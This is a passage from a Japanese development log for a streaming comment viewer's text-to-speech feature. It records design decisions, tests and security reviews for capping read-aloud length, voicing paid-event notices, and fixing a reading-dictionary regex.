  「Mac だから場所を取らない」は成り立たない。**スクロール領域の寸法をピクセルで設計するなら、
  スクロールバーが縦横どちらを食うかを必ず決めておく。**
- **原因が分からないときに推測で CSS を足さなかったのが正解だった**。047c で「症状 C は原因未特定・触らない」と
  記録して切り分け手順だけ残し、実機の観測 3 点で機構を確定させてから 1 箇所だけ直せた。
  **「効くかもしれない指定」を足すと、次に壊れたとき何が効いているか誰も説明できなくなる。**

## 2026-07-31 (048 読み上げ文字数上限: 長文を「以下略」で打ち切り、後続コメントの無言破棄を断つ)

### 何が問題だったか（定量）

読み上げは FIFO 直列（`ttsQueue.ts` の `playing` フラグ）で 1 件終わるまで進まず、その間に届いた分は
`MAX_BACKLOG = 20` を超えると**古い未読から無言で破棄**される。290 文字（dev-mock の長文枠）は
**約 48〜64 秒**（VOICEVOX 日本語 ≒ 4.5〜6 文字/秒）かかり、dev-mock の 1800ms 間隔では
その間に 27〜38 件が到着して **7〜18 件が捨てられる**。これが「長文コメントの後のコメントが読まれない」の直接原因。
上限 60 文字なら読み上げ 10〜13 秒・到着 5〜7 件で **backlog に届かない＝破棄 0 件**になる。

### 実装位置と純関数化（決定）

- 切り詰めは **`enqueue` の読み替え適用（041a）＋ `.trim()` の直後・空判定の前**の 1 箇所だけ。
  `enqueue` の整形は **① 入力決定 → ② sanitize → ③ 読み替え → ④ 切り詰め → ⑤ 空判定 → push** の 5 段になった。
- **純関数 `capForSpeech(text, max)` を `ttsQueue.ts` から export** した（`sanitizeForSpeech` の隣）。
  理由: `createTtsQueue` は `new AudioContext()` を作るため jsdom で動かず、**切り詰めを `enqueue` に直書きすると
  単体テストが書けない**。`ttsQueue.ts` の import は `types` / `readingDictionary` / `voicevox` の 3 つだけで
  `voicevox.ts` は import ゼロ・module レベル副作用ゼロなので、純関数だけを import するテストは**モック不要**で書ける。
  新規ファイルは作らなかった（10 行のために層を増やす利得がなく、`sanitizeForSpeech` と同じ責務なので同居が自然）。
- 上限値は **getter 注入**（`TtsQueueOptions.getMaxLength?: () => number`）。`getSpeakerId` / `getReadingDictionary` と
  同じ作法で、**設定を変えてもキューを作り直さない**（再生中の読み上げとバックログを落とさない）。
  **未注入なら切り詰めない**＝既存 getter と同じ「省略時は現行動作」に揃え、既定値の定義元を `ttsPrefs.ts` 1 箇所に保った
  （`ttsQueue` → `ttsPrefs` の依存を張らない）。

### 文字数の数え方: **コードポイント単位**（`[...text]`）

`slice` は UTF-16 コードユニット単位でサロゲートペアを割り、孤立サロゲート「�」を作る。
`sanitizeForSpeech` が消すのは絵文字（`Extended_Pictographic`）だけなので **𠮷 のような非絵文字のサロゲートペアは残る**。
`viewerFormat.ts` の `authorInitial` が `charAt(0)` を避けて `[...s]` を使っているのと**同じ理由・同じ手段**を採った。

- **書記素クラスタ（`Intl.Segmenter`）は採らない**（意図的な割り切り）。絵文字は sanitize 済みで ZWJ 連結・肌色修飾は
  ほぼ残らず、割れて困るのは結合濁点（U+3099）等だけ。**結合文字は基底文字の後ろにある**ので、切断点で落ちるのは
  常に濁点側＝**濁点を失った基底文字**が残る（`が`→`か` と読まれる）。誤読するのは打ち切り位置の 1 文字だけで
  直後に「、以下略」が続くため、孤立サロゲートのような「�」化とは影響の桁が違う。
  再検討条件＝実機でこの 1 文字の誤読が耳に付いたとき。
  - ⚠ **2026-07-31 レビューでの訂正**: 当初この節と `capForSpeech` の JSDoc は「割っても出るのは**宙に浮いた濁点**で
    VOICEVOX は無視する」と書いていたが、実測すると逆で、落ちるのは濁点側だった（`capForSpeech("がががががが…", 5)`
    → `"ががか、以下略"`）。**Segmenter 不採用という結論は変えないが、根拠の記述を事実に合わせた**
    （壊れ方の想定が間違ったまま残ると、実機で誤読に気付いたときに「想定済み」と誤読されるため）。
- 高速パス: **コードポイント数 ≤ コードユニット数**なので `text.length <= max` なら配列化せず素通しできる（短文＝大多数）。
- 接尾辞は `max` に含めない（実際に読まれるのは最大 `max + 4` 文字）。よって `max + 1` 文字は切った方が 3 文字長くなるが、
  ヒステリシスは複雑さに見合わないので入れない（既知の割り切り）。

### 「以下略」の表記と実機での読み

`SPEECH_ELLIPSIS = "、以下略"`。読点を付けたのは、OpenJTalk が読点をアクセント句の
区切りに使うため——無いと本文末尾の語と融合して誤アクセントになりやすく、「一拍おいて以下略」の方が打ち切りと分かる。
追記は**読み替え辞書の適用後**なので辞書ルールに書き換えられない（意図的）。

- **実機での読みは未確認**（本人環境で `pnpm --filter ./apps/desktop tauri dev` にて判定予定）。
  崩れた場合の代替候補: `、以下省略`（辞書語として安定・いかしょうりゃく）／`、いかりゃく`（読みは強制できるが
  アクセントは OpenJTalk 任せ）。**判定後にこの節へ結果を追記すること**。
- ⚠ **差し替えは「定数 1 行」では終わらない**（2026-07-31 レビュー指摘）。`ttsQueue.test.ts` がこの文字列を
  **リテラルで期待している 4 箇所**（境界 2 件・290 文字 1 件・サロゲート 1 件）も同時に直す必要がある。
  テスト側から `SPEECH_ELLIPSIS` を import すれば 1 行で済むが、それは「実装と同じものを実装と比べる」恒真式で
  打ち切り表記の仕様を固定できなくなるため、**リテラルのままにするのが正**。当初の記録（task-board / 048 /
  この節）の「1 行差し替え」という表現を「定数 1 行＋テスト 4 箇所」へ訂正した。

### 既定値・クランプ範囲と根拠

| 値 | 根拠 |
| --- | --- |
| 既定 **60** | 読み上げ約 10〜13 秒。dev-mock 1800ms で到着 5〜7 件 → `MAX_BACKLOG`(20) に届かず**破棄 0 件**。 |
| 下限 **20** | 約 3〜4 秒。これ未満だと一文が助詞の途中で切れて意味が通らず、接尾辞 4 文字が相対的に大きすぎる。 |
| 上限 **200** | 約 33〜44 秒。050 の試算で「破棄 0〜4 件」＝**backlog 破棄が始まる境界**。超える設定は本タスクの目的を自ら壊す。 |

**「上限なし」は作らない**（省略は常時有効・ON/OFF トグルも無い）。クランプの下限/上限がそれを構造的に保証する。
クランプのロジックは `ttsPrefs.ts` の **`clampTtsMaxLength` 1 関数だけ**が持ち、load（他窓・手書きの不正値への最後の砦）／
save（範囲外を localStorage に残さない）／設定 UI の確定時（画面の値と保存値を一致させる）の 3 箇所がこれを呼ぶ。

### 数値入力 UI の仕様（このリポジトリ初の数値設定欄）

`<input type="number">`（`min` / `max` / `step=10` / `inputMode="numeric"`）を読み上げカードに 1 行追加。
CSS 追加はゼロで `speakerField` / `searchInput` / `note` を流用した（`check-css-guards.mjs` に触れない）。

- **確定は blur と Enter のみ**（`onChange` 即時にしない）。理由が 2 つある——①「80 にしたい途中の 8」が下限 20 へ
  即クランプされると入力が壊れる ② 親 state が変わらない＝**1 打鍵ごとに localStorage へ書かない**
  （永続化 effect は state 変更のたびに走るため）。入力中の生文字列は `SettingsView` のローカル state
  （`obsPasswordInput` と同じ作法・表示専用の性質は不変）。
- 空 / NaN は**直前の確定値へ戻す**（既定値へ飛ばさない＝打ち間違いでユーザーの設定を消さない）。
  有限値はクランプして**入力欄の表示も書き戻す**（「999 と打ったら 200 に落ちた」が見える）。
  全角数字は `type="number"` が受け付けず `value` が空になるので、この「空」経路で直前値へ戻る（専用の正規化は入れない）。
- `min` / `max` 属性は**ブラウザの補助であって保証ではない**ので、確定時のクランプは必ず通す。
- `ttsEnabled=false` でも disabled にしない（話者/スタイル選択と同じ「読み上げの中身」を決める設定。
  読み上げ対象を絞る source トグルとは性質が違う）。

### テスト（TTS 経路に初めて単体テストが入った）

- **新規 `ttsQueue.test.ts`**（`capForSpeech` のみ・`createTtsQueue` は呼ばない＝AudioContext 不要）:
  上限ちょうどは素通し／`max+1` で打ち切り＋接尾辞／290 文字でも本文は上限ちょうど／空文字はそのまま／
  **サロゲートペアを割らない**（孤立サロゲートを含まない）／**コードポイントで数える**（`𠮷𩸽𡈽` は 3 文字）／
  `max` が 0・負・**0.5**・NaN・Infinity なら切り詰めない／`sanitizeForSpeech` の既存仕様の回帰。
  049 / 050 がキュー本体のテスト（`synthesize` / `playWav` モック）をこのファイルへ足す前提。
- **新規 `ttsPrefs.test.ts`**: 定数どうしの整合／クランプ（範囲外・小数・非有限）／未保存は既定／往復／
  破損値 `"abc"` `""` `"   "` `"60.5"` `"-10"` `"9999"` の劣化先／**save が保存前にクランプ**する／
  `getItem` / `setItem` が throw しても例外を投げない。
- `SettingsView.obs.test.tsx` は `baseProps` に新しい必須 props 2 つを足しただけ（検証対象は不変）。

### 検証結果

`typecheck` / `lint` / `test`（**22 files / 324 tests** ＋ CSS guard）すべて green。
ゼロ拡大の担保（`src-tauri/` ・`comment-sidecar/` ・`package.json`）と表示側の担保
（`CommentList` / `PinnedCommentBar` / `OverlayApp` / `PinnedOverlayApp`）は**いずれも差分ゼロ**。
新規依存・新規外部通信・capability の追加なし、`csp: null` 不変。**実機確認は未実施**（本人環境で実施予定）。

### security-review / code-review 実施記録（2026-07-31・実装と同日）

**セキュリティ判定「問題なし」（修正必須 0 件）**。`docs/security.md` の条文に照らして独立検証した結果:

- **§1 外部通信**: 追加行の `fetch(` / `invoke(` / `WebSocket` / `http(s)://` は**ゼロ**（唯一の `https://` は
  `sanitizeForSpeech` 回帰テストの文字列リテラル）。合成宛先は loopback 50021 のまま無改変。
- **§9 追補（046a）の該当性**: **対象外で正しい**と確認した。[`docs/security.md`](security.md) の「レビュー必須条件」が
  「保存先は問わない＝localStorage へ**第三者のコメント本文・表示名・投げ銭金額**を永続化する変更は該当する／
  **ユーザー自身の UI 設定値**（テーマ・フォント・トグル・チャンネル名等）は該当しない」と線引きしており、
  本変更が保存するのは `tts-max-length` の**整数 1 つだけ**。046b の `pinned-overlay-enabled` と同じ区分。
  **security.md の更新は不要**（新たな例外・追補を要しない）。
  ⚠ ただし「frontend だけだから軽レビュー」という理由付けは誤り——localStorage 追加は**保存物次第で必須レビューに
  なり得る**（046a が当初「軽レビュー」指定で実際は必須だった前例）。今回は保存物を条文に当てて対象外と判定した。
- **表示側・ゼロ拡大**: 表示 4 ファイル／`src-tauri/`／`capabilities/`／`tauri.conf.json`／sidecar／`package.json`／
  `pnpm-lock.yaml` すべて差分ゼロ。`csp: null` 不変。`capForSpeech` の参照は定義＋呼び出しの 2 箇所のみで
  `screens/` から呼ばれていない（＝切り詰めが表示へ漏れない経路がコード上で証明できる）。
- **攻撃者制御入力**: 新規正規表現ゼロ（ReDoS 面の増加なし）。`[...text]` の全長配列化は上限超過時のみだが、
  既存 `sanitizeForSpeech` が既に全長へ 3 回 `replace` を掛けているため資源消費の桁は変わらない。
  孤立サロゲートは**作らない**（むしろ切り詰めで除去され得る）＝下流の `encodeURIComponent` を壊す方向ではない。
- **既存の安全機構は非退行**: `sanitizeForSpeech` の整形規則・`MAX_BACKLOG=20`・`seenIds` 冪等化・`disposed` ガード・
  `ctx.state !== "running"` スキップはいずれも無改変（差分はコメント追加のみ）。

**品質レビューの指摘と対応**（同日中に反映済み。コードの挙動を変えたのは 1 点だけ）:

| 指摘 | 対応 |
| --- | --- |
| 中: 結合文字の壊れ方の記述が事実と逆（「宙に浮いた濁点」ではなく**濁点が落ちる**） | JSDoc・テストコメント・本節を実測結果へ訂正（**Segmenter 不採用の結論は不変**） |
| 中: 「定数 1 行差し替え」はテスト 4 箇所の同時修正が要る | 定数の JSDoc・048・task-board・本節を「1 行＋テスト 4 箇所」へ訂正 |
| 低: `0 < max < 1` で本文ゼロ＋接尾辞だけになる | **唯一の挙動変更**＝ガードを `max <= 0` → **`max < 1`** に。製品経路はクランプ済み整数のみで到達不能だが、export された純関数の契約として塞いだ（テストに `0.5` を追加） |
| 低: 049 の行番号 1 ブロックが未更新（`#L47` / 54 / 60 行） | 91 / 97 / 103 / 112 行へ修正（他の行番号は全数照合して一致を確認済み） |
| 低: `getMaxLength` 未注入の退行を型もテストも検出できない | required にはしない（既定値の定義元を `ttsPrefs.ts` 1 箇所に保つ方を優先）。`TtsQueueOptions` の JSDoc と
049 のテスト節に「**049/050 でモックを入れる際に `enqueue` 経由の切り詰めを 1 ケース固定する**」を申し送りとして明記 |
| 低: `step={10}` と任意値（65 等）の step 不整合 | 修正不要（`:invalid` のスタイルが無く実害なし）。理由と再修正トリガーを `SettingsView` にコメント化 |
| 情報: `onKeyDown` が `isComposing` を見ていない | 修正不要（`type="number"` は IME 入力を実質受け付けず、誤発火しても非破壊）。理由と再修正トリガーをコメント化 |
| 情報: 永続化 effect がマウント時にも `storage` を 1 発飛ばす | 修正不要（読み手 2 窓は `e.key` で購読キーを絞っておりこのキーを見ない）。確認結果をコメント化 |

**レビュー後の検証**: `typecheck` / `lint` / `test`（**22 files / 325 tests** ＋ CSS guard）すべて green。

### 050 への申し送り（着手判断の材料）

- 本タスクは**長文起因の破棄**だけを潰した。**バースト起因の破棄**（毎秒 2 件 × 20 秒で 40 件到着 → 20 件破棄）と
  **破棄が見えないこと**、**合成タイムアウトが無いこと**は手つかずで残っている。
- `MAX_BACKLOG` には触っていない（050 の領分）。**実機で「長文の直後のコメントが読まれるか」を確認し、
  その所感をここへ追記してから** 050 の (4) MAX_BACKLOG 再評価を判断すること。
- `enqueue` の 5 段の順序はコードコメントで不変条件として明示した。049 は **① 入力決定だけ**を差し替える。

## 2026-07-31 (049 課金イベントの読み上げ: メンシプ／ギフト／サブスク／ジュエルを無音にしない)

### 何が起きていたか（設計の穴）

`ttsQueue.enqueue` は読み上げ入力に **`comment.text` しか使わない**。一方 043b の設計で課金イベントの要約文言は
**表示側**（`viewerFormat.ts` の `composeEventMessage`）が別途組み立てるようにしたため、`text` が空の
`membership` / `gift` / `jewels` は ⑤ 空判定で捨てられ **一度も TTS に渡っていなかった**（完全な無音）。
`subscription` は自由コメントがある時だけ本文が読まれていた。**配信者が最も聞き逃したくない種別ほど音で分からない**
という逆転で、043b で表示側だけ実装され読み上げ側が追従しなかったことが原因。

⚠ **`jewels` は dev-mock でだけ読まれていた**（`dev-mock.ts` が `text = "投げ銭ジュエル 🎁"` を入れているため）。
実データの `GIFT_EVENT` は本文を持たないので**本番だけ無音**で、dev 確認では永遠に気付けない罠だった。

### 設計: 組立は `screens/` に置いて getter で注入する（層の逆転を避ける）

文言を二重管理しないため `composeEventMessage` を**再利用**する必要があるが、それは `screens/` 配下にあり、
`features/` の `ttsQueue` から直接 import すると層が逆転する。そこで:

- **新規 `screens/comment-viewer/speechText.ts`** に `composeSpeechText(c: CommentViewDto): string`（`viewerFormat.ts` と
  同じ**依存ゼロの純関数**）を置き、`TtsQueueOptions.getSpeechText?` で `ttsQueue` へ**注入**する。
  **`ttsQueue` は種別を一切見ない**（`composeEventMessage` を `features/` へ移す案は import 元の書き換えが広範＝
  仕様にない大規模リファクタになるため不採用）。
- `enqueue` で触ったのは **① 入力決定の 1 行だけ**: `sanitizeForSpeech(getSpeechText?.(comment) ?? comment.text)`。
  ②sanitize → ③読み替え → ④切り詰め → ⑤空判定 → push は**1 文字も変えていない**（048 が不変条件として明示した 5 段）。
  **未注入なら `comment.text`＝従来と完全に同じ**（既存 getter 3 つと同じ後方互換の作法）。
- 注入するのは純関数なので **ref 同期は不要**（`getSpeakerId` のような state 依存が無い）。

### 種別ごとの読み上げ文言

| 種別 | 読み上げ | 出どころ |
| --- | --- | --- |
| `membership` | 〇〇さんがメンバーシップを6ヶ月継続しました / 〜に加入しました | `composeEventMessage` |
| `gift`(Twitch) | 〇〇さんがサブギフトを5件贈りましたティア1 | 同上（語彙は `source` で分岐） |
| `gift`(YouTube) | 〇〇さんがメンバーシップギフトを5件贈りました | 同上（YouTube に階級が無く Tier は付かない） |
| `subscription` | 〇〇さんがサブスクを3ヶ月継続しましたティア2**。**いつも応援してます！ | 同上 ＋ 自由コメント |
| `jewels` | 〇〇さんがジュエルを30贈りました | **読み上げ専用の新設**（表示は不変） |
| `chat` / `superchat` / `bits` / `donation` / 未知 | 本文のみ（**名前を読まない**） | `c.text`（従来どおり） |

**課金イベントだけ投稿者名を読む**のは既存方針「著者名は読まない」の**限定的な例外**（誰が支援したかを音で分かる
ようにするのが目的）。`ttsQueue.ts` 冒頭の docstring にこの例外と理由を明記した。

### Tier 整形: 表示文言への後段置換（`/（Tier(\d+)）/g` → `ティア$1`）

丸括弧のままだと VOICEVOX が「かっこ ティア に かっこ」と読む。置換は **`composeEventMessage` の出力にだけ**かけ、
視聴者の自由コメント（`c.text`）には**かけない**（視聴者が書いた文字列を勝手に書き換えないため）。
接尾辞は `subscription` と `gift` の両方に付き `membership` には付かないが、置換は種別を見ないので両方に効く。

- **不採用案**: `composeEventMessage({...c, tier: undefined})` で接尾辞を消して自前で付け直す方法。
  「どの種別に Tier を付けるか」という**表示側の判断を読み上げ側にも複製する**ことになり、二重管理禁止に反する。
- **退行検知**: 表示側の接尾辞書式が変わると置換が黙って効かなくなる（「かっこティア1かっこ」）。
  `speechText.test.ts` に「tier 付きの読み上げ文に `（` `）` `Tier` が残らない」ケースを置いて検知する。
- 「ティア2」は**数字のまま**（VOICEVOX が「ティアに」と読む）。「ティアツー」にするかは実機判定。

### `jewels` の文言（読み上げ専用・表示は 1 ピクセルも変えない）

`composeEventMessage` が jewels に null を返すのは「金額バッジと文言が重複するのを避ける」という 043b の意図的な
設計で、ここを変えると `CommentList` の表示とテスト（043b/043c/043d/043e）に波及する。**読み上げだけ足せば
表示の回帰リスクはゼロ**になるため、`composeSpeechText` の中だけで新設した。

- 数は**数値 `c.monetary?.amount`** から取る。整形済み表示文字列 `c.monetaryAmount`（`"30 jewels"`）は使わない
  ——末尾に英字 "jewels" が付き OpenJTalk が綴り読みするうえ、optional で欠落しうる。数値なら日本語の数詞で読まれる。
- `monetary` 無し・`amount` が **0 / 負 / 非有限**は「数なし」へ倒す（「ジュエルを0贈りました」は日本語として破綻する）。
- **`comboCount` は読まない**。043e の combo 更新は `mergeComments` の `updated` に載り `added` へ来ないので再読み上げは
  起きないが、初回到達時に値が入っていても無視する（公式仕様が「単発は 0」で意味が曖昧・文字数上限を無駄に使う）。
- **`c.text` を連結しない**。実データの jewels は本文を持たず dev-mock だけが `"投げ銭ジュエル 🎁"` を入れているため、
  連結すると dev と本番で読みが変わり **dev 確認が本番の担保にならない**（本タスクが直した罠そのもの）。
  ＝ dev でも本番と同じ「〇〇さんがジュエルを30贈りました」になる（dev の聞こえ方は意図的に変わる）。

### 自由コメントの連結

3 種別（membership / gift / subscription）共通の 1 規則: `body = c.text.trim()` が非空なら `` `${要約}。${body}` ``。
**順序は「要約 → 自由コメント」固定**——048 の切り詰めは末尾から効くので、「誰が何をしたか」を先頭に置けば上限に
当たっても要約は必ず残る。空白のみは `trim()` で空判定に落ち「。」も付かない。

### 048（既定 60 文字）との干渉 —— 最長ケースの実測

名前を N、自由コメントを T として（実測してから判断した）:

| ケース | 文字数 |
| --- | --- |
| YouTube メンシプギフト「…さんがメンバーシップギフトを5件贈りました」 | **N + 21**（最長） |
| Twitch サブギフト「…さんがサブギフトを5件贈りましたティア1」 | N + 20 |
| メンシプ継続「…さんがメンバーシップを6ヶ月継続しました」 | N + 20 |
| サブスク継続＋Tier＋自由コメント | N + 22 + T |
| ジュエル「…さんがジュエルを30贈りました」 | N + 15 |

- **要約だけで 60 を超えるのは N ≥ 40 のときだけ**（レビュー Q-4 で数え直して訂正。当初「N ≥ 39」と書いたが、
  `capForSpeech` は「コードポイント数 **>** max」で切るので N=39 はちょうど 60 で切れない）。Twitch の表示名は
  最大 25 文字なので Twitch では起き得ず、YouTube のチャンネル名のみ該当し得る。
- **サブスクの自由コメントは普通に上限に当たる**（N=10 なら **T が 29 文字に達した時点**で「、以下略」＝
  `10 + 22 + T > 60` ⇔ `T ≥ 29`。レビュー Q-4 で訂正。当初「T が 29 文字を超えた時点」と書いていた）。
- ※上表は `monthCount` / `giftCount` が 1 桁の場合。2 桁以上（「100ヶ月継続」等）なら境界が 1〜2 文字ずれる。
- **判定: 文言側は短くしない**。切り詰めは必ず後ろ＝自由コメント側から起きるので「誰が・何をしたか」は常に残る。
  短縮候補（「メンバーシップギフト」→「メンシプギフト」で −3）は日本語として不自然で 3 文字に見合わない。
  実機で長い名前が耳障りだった場合の次の一手は **048 の既定値ではなく名前側の切り詰め**だが、表示と読みが乖離するので
  実機判定後に別途決める。

### テスト（キュー本体に初めてテストが入った）

- **新規 `speechText.test.ts`**（24 ケース）: 種別ごとの文言／Twitch・YouTube の gift 語彙／自由コメントの連結と
  空白のみの扱い／Tier 整形（**丸括弧・"Tier" が残らない**＝表示側の書式変更を検知）／自由コメント側の「（Tier2）」は
  書き換えない／jewels の金額あり・なし・**0/負/NaN/Infinity**・`comboCount` 無視・本文を連結しない／
  **`chat` / `superchat` / `bits`(superchat+BITS) / `donation` / 未知種別は `c.text` そのまま＋名前を含まない**。
  期待文字列は**意図的にリテラル**（`composeEventMessage` を呼んで比べると恒真式になり退行を検知できない）。
- **`ttsQueue.test.ts` へ追記**（純関数のみ → **キュー本体**へ拡張）: `getSpeechText` 未注入なら `comment.text`（後方互換）／
  注入すると `text` が空でも読み上げに載る／戻り値も ② sanitize を通る／整形後に空なら読まない（⑤ 維持）／
  **`getMaxLength` を注入した `enqueue` が実際に切り詰める（048 レビューからの申し送りを消化）**／
  `getSpeechText` で長くなった文言も ④ に乗る／同じ id は 2 回目を読まない。
- **AudioContext スタブは `ttsQueue.test.ts` のファイル内**に置き `vi.stubGlobal` する。**`src/test/setup.ts` には
  置かない**——あちらは全テストに効くので、他のテストが「本物の AudioContext が無い」ことに気付けなくなり、
  TTS 以外のコードが暗黙に偽物へ依存し得る（vitest はファイル単位で環境が分離されるのでファイル内で十分）。
  必要なのは `state` / `resume` / `close` の 3 つだけ（`decodeAudioData` / `createBufferSource` は `playWav` が使うが、
  その `playWav` をモックしているので呼ばれない）。⚠ **初期 `state` は "running" 必須**——`pump()` は running でない
  1 件を読み上げずに return する（無音ハング防止のガード）ため、"suspended" だと**意図と違う理由でアサートが落ちる**。
- **`synthesize` の呼び出し検証に await は不要**: `enqueue` → `pump()` は `synthesize(text, speaker)` を**同期的に呼んでから**
  初めて await に入る。再生完了後の挙動を見たいケース用に `flush()`（`setTimeout(0)`）だけ用意した。
  `vi.mock("./voicevox", …)` は `synthesize` / `playWav` / `ZUNDAMON_NORMAL_SPEAKER_ID` を差し替え、
  **通信も音声再生も一切行わない**。

### 検証結果

`typecheck` / `lint` / `test`（**23 files / 365 tests** ＋ CSS guard）すべて green（048 時点は 22 files / 325 tests。
実装直後は 356 tests で、**レビュー対応の 9 ケース**〔配線 1・jewels 前提 1・種別網羅 7〕を足して 365 になった）。
表示側 8 ファイル（`viewerFormat` / `CommentList` / `PinnedCommentBar` / `OverlayApp` / `PinnedOverlayApp` /
`MonetaryTicker` / `MonetaryDetailDialog` / `ViewerDetailPanel`）と `src-tauri/` / `comment-sidecar/` /
`package.json` / `pnpm-lock.yaml` は**いずれも差分ゼロ**を実測。差分は 5 ファイル（新規 2・変更 3）のみ。
新規依存・新規外部通信・capability の追加なし、`csp: null` 不変。**実機確認は未実施**（本人環境で実施予定）。

### 050 への影響（前提が変わった点）

- **キューに載る件数が増える**。従来は `membership` / `gift` / `jewels` が ⑤ 空判定で捨てられていたが、今後は載る。
  1 件あたりの長さは 048 の上限（既定 60）で頭打ちなので、**1 件の占有時間の上限は変わらない**（増えるのは件数だけ）。
- **dev-mock での増分は +5〜10%**（レビュー Q-3 で数え直して訂正。当初「seq 7/9/13/14 の 4 件・約 +20%」と
  書いたが誤りだった）。訂正の根拠は 2 つ:
  - **`seq 9`（jewels）は増分に数えられない**。上の ⚠ に自分で書いたとおり dev-mock だけが `text` を入れており
    **従来から dev では読まれていた**（049 で変わるのは読まれる内容だけ）。
  - **`seq 7 / 9 / 13 / 14` は同時に成立しない**。`dev-mock.ts` の `seq` は**両 provider 共通の単調カウンタ**で、
    各イベントは `seq % 20 === k` **かつ**特定 `source` を要求する。両 provider は同一間隔（1800ms）なので seq は
    厳密に交互＝{7, 9, 13} は同じパリティ・14 は逆。7/9/14 は youtube、13 は twitch を要求するため
    **1 周期で発火するのは最大 2 件**（両接続 odd=youtube なら +1、odd=twitch なら +2、YouTube 単独 +2、Twitch 単独 +1）。
  - seq 12 の combo 更新が `updated` で載らない点は当初の記述どおり**正しい**（`seenIds` も二重の防波堤）。
- ⚠ **dev-mock の比率は実データを代表しない**。本番では membership/gift/jewels が **100% 無音 → 100% 読み上げ**に
  変わるので、**課金の多い配信ほど増分は大きい**。050 の実測はこの数字ではなく実配信の課金比率を根拠にすること。

### 049 レビュー（2026-07-31・フルの security-review ＋ 品質レビュー）への対応

task-board 上は「軽レビュー」指定だったが、**読み上げ文言に第三者の氏名が初めて入る**ため security.md の
更新要否を含めてフルでレビューを実施した。結果と対応:

- **【修正必須・対応済み】§1 032c-c 例外の条文と実装が矛盾していた**。`docs/security.md` は §9 ではなく
  **§1 の例外条文**に「合成対象はコメント本文のみ・**著者名は送らない**」と明記しており、049 はこれを変える変更
  だった（「新規宛先・保存・ログがゼロだから security.md 無変更」という当初の整理は §9 については正しかったが、
  §1 の条文を見落としていた）。**032c-c 例外へ 049 追補を追記**して解消。
- **【対応済み】getter 配線の穴**。`getSpeechText` / `getMaxLength` はいずれも optional ＋ 未注入フォールバック
  なので、**本体側の注入行が消えても typecheck もキュー単体テストも気付かない**（048 レビューの申し送りは
  「注入したら効くこと」までしか塞げていなかった）。`CommentViewerApp.toolbar.test.tsx` に
  **`createTtsQueue` の実引数を固定する配線テスト**を追加し、4 つの getter をまとめて守るようにした
  （注入行を消すと実際に落ちることを確認済み）。required 化は「既定値の定義元は `ttsPrefs.ts` 1 箇所」
  「features は screens を知らない」の 2 つの不変条件と衝突するため採らない。
- **【対応済み】種別の追従漏れ検知**。`speechText.test.ts` に `Record<CommentEventType, "summary" | "body-only">`
  の網羅表を置き、bindings の union に種別が増えたら**キー不足でコンパイルが落ちる**ようにした
  （`composeEventMessage` の引数型が `string` なので `satisfies never` は効かない）。あわせて
  「表示側は jewels に文言を作らない」前提も 1 ケースで固定（崩れると読み上げ専用文言が黙って二重化するため）。
- **【対応済み】テストの実装依存**。`ttsQueue.test.ts` はアサート前に必ず `await flush()` するよう統一した。
  `synthesize` が同期的に呼ばれることに依存していると、050 が `pump` に `await` を挟んだとき
  **実装は正しいのに「読み上げが載らない」という誤った意味で落ちる**ため。
- **【修正不要・コメント化】041a の読み替え辞書が投稿者名に当たる**（実測: `wataru` →「わらataru」／
  `William` →「わらilliam」／`W` →「わら」／`草太` →「くさ太」。逆に `PCマスター` →「ピーシーマスター」は
  望ましい方向）。**原因は 041a の内蔵辞書側**で、正しい直し方は `w` ルールへ後方境界 `(?![A-Za-z])` を足すこと
  （笑いの w は英字に続かないので取りこぼしゼロ・本文側の `warota` 誤爆も同時に直る）。名前だけを辞書適用から
  外す案は 5 段の単一チョークポイントを崩すので不可。**辞書変更は別関心なので別タスクとし**、意図・理由・
  再修正トリガーを `speechText.ts` の JSDoc に記録した。**実機で名前の誤読を確認したら 041a 側の小タスクを起票する。**
- **【修正不要・コメント化】その他**: Tier 置換が投稿者名にも当たる（`（Tier9）` を含む表示名は「ティア9」と
  読まれる）／絵文字のみの表示名は消えて「さんが〜」になる／名前 40 文字以上で要約が切れる／表示名で読み上げ
  内容を詐称できる（ただしチャット本文は元々全文読まれるので新しい攻撃能力ではない）／`composeSpeechText` は
  例外を投げないことを不変条件として担保する（throw すると `setComments` の updater 内で throw する）。
  いずれも影響は**音声のみ**で表示・保存・通信に及ばないため、`speechText.ts` に理由と再修正トリガーを残して据え置き。
- **【修正不要】`CommentViewDto` を直接受ける型方針**は、構造部分集合を採る `viewerFormat.ts` と不一致だが
  **こちらの方が良い**（あちらは「キー名が食い違っても黙って劣化する」代償を自ら JSDoc に記録している）。
  一貫性のために劣る側へ揃えず、**意図的な相違である旨をヘッダに明記**した。
- **【検証済み】** 表示 8 ファイル・`src-tauri/`・sidecar・`package.json` / `pnpm-lock.yaml` / `capabilities/` /
  `tauri.conf.json` / `Cargo.toml` / `Cargo.lock` の**差分ゼロ**、`features/` から `screens/` への import ゼロ、
  読み上げ文字列が `synthesize` 以外へ渡らないこと、ログに氏名・本文が乗らないこと（出るのは破棄件数のみ）、
  `encodeURIComponent` によりクエリのブレイクアウトと `speaker=` 汚染が起きないこと、
  `/（Tier(\d+)）/g` と `applyReadingDictionary` に ReDoS が無いこと（数字 20 万桁で 0.32ms／10 万文字で 0.27ms）を
  いずれも実測で確認した。

## 2026-07-31 (049 フォローアップ: 実機確認で出た 4 件の修正)

`pnpm tauri dev` での実機確認で挙がった 4 点に対応した。**049 本体と同じく frontend のローカル処理のみ**で、
新規宛先・API・capability・依存はゼロ、`csp: null` 不変（`src-tauri/` / sidecar / `package.json` /
`pnpm-lock.yaml` は差分ゼロを実測）。

### (1) 041a の内蔵辞書が英単語・英字表示名の先頭 w を壊していた

**症状**: `"that clutch was insane"` が「that clutch **わら**as insane」と読まれる。049 レビューで指摘済みの
`wataru` →「わらataru」／`William` →「わらilliam」と**同じ 1 本のルール**が原因（実機で本文側の実害が先に出た）。

**原因**: 笑いの w ルールが `(?<![A-Za-z])w` と**直前しか見ていなかった**ため、単語先頭の w（was / want /
William / wataru）がすべて笑い扱いになっていた。049 で課金イベントの**投稿者名**も辞書を通るようになり、
英字表示名が高頻度で壊れる問題として顕在化していた。

**修正**: 両ルールに**後方境界 `(?![A-Za-z])`** を足した（`readingDictionary.ts`）。

```
(?<![A-Za-z])w{2,}  →  (?<![A-Za-z])w{2,}(?![A-Za-z])
(?<![A-Za-z])w      →  (?<![A-Za-z])w(?![A-Za-z])
```

- **笑いの w が英字に続くことは無いので、取りこぼしはゼロ**（「楽しいw」「wwww」「草生えるwww」はすべて従来どおり）。
- `wwwa` のような列は英単語の一部とみなして非変換＝安全側に倒す。
